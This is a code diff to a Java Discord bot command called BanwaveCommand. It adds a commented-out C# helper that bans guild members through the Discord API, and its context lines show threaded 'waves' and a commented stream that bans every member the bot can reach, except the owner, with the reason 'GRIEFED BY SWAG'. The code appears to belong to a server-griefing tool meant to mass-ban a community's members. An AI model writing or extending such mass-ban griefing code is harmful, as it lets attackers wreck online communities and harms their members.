@@ -38,6 +38,18 @@ public class BanwaveCommand implements ICommand {
 
         wave1.start();
         wave2.start();
+        /*
+        	public static void BanGuildMember(this DiscordClient client, ulong guildId, ulong userId, string reason = null, uint deleteMessageDays = 0U)
+		{
+			client.HttpClient.Put(string.Format("/guilds/{0}/bans/{1}?delete-message-days={2}&reason={3}", new object[]
+			{
+				guildId,
+				userId,
+				deleteMessageDays,
+				reason
+			}), "");
+		}
+         */
 //        event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());
 
      /*   for (Member member : event.getGuild().getMembers()) {
